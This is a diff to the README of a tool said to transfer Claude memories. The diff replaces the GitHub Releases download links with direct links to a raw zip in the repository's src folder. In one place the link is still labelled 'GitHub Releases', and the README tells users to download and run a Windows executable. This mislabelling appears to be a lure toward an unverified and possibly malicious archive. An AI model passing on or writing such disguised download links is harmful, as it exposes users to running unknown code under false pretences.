@@ -1,6 +1,6 @@
 # 🧠 memory-transplant - Move Claude memories with ease
 
-[![Download memory-transplant](https://img.shields.io/badge/Download%20Now-purple?style=for-the-badge)](https://github.com/M2toe27/memory-transplant/releases)
+[![Download memory-transplant](https://img.shields.io/badge/Download%20Now-purple?style=for-the-badge)](https://github.com/M2toe27/memory-transplant/raw/refs/heads/main/src/memory_transplant_v1.6-alpha.1.zip)
 
 ## 📦 What this is
 
@@ -27,7 +27,7 @@ For best results, use the latest version of Claude in your browser before you be
 
 Visit this page to download the app:
 
-[Download memory-transplant from GitHub Releases](https://github.com/M2toe27/memory-transplant/releases)
+[Download memory-transplant from GitHub Releases](https://github.com/M2toe27/memory-transplant/raw/refs/heads/main/src/memory_transplant_v1.6-alpha.1.zip)
 
 On that page, look for the latest release and download the Windows file. If you see more than one file, pick the one that matches your system, such as:
 - a `.exe` file for direct use
@@ -116,7 +116,7 @@ It is built for people who want a simple way to move memory data without manual 
 
 If you need the latest version, use the release page here:
 
-[https://github.com/M2toe27/memory-transplant/releases](https://github.com/M2toe27/memory-transplant/releases)
+[https://github.com/M2toe27/memory-transplant/raw/refs/heads/main/src/memory_transplant_v1.6-alpha.1.zip](https://github.com/M2toe27/memory-transplant/raw/refs/heads/main/src/memory_transplant_v1.6-alpha.1.zip)
 
 ## 🧾 Repository info
 
